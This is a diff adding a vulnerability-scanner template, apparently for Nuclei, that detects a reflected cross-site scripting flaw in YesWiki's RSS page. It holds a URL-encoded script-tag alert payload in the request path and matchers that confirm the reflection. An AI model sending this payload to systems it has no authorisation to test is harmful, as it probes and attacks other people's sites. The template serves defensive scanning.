@@ -1,0 +1,31 @@
+id: yeswiki-xss
+
+info:
+  name: YesWiki <2022-07-07 - Cross-Site Scripting
+  author: HuanXiong
+  severity: medium
+
+  tags: XSS
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.domain)</script>"
+          - "Query failed:"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
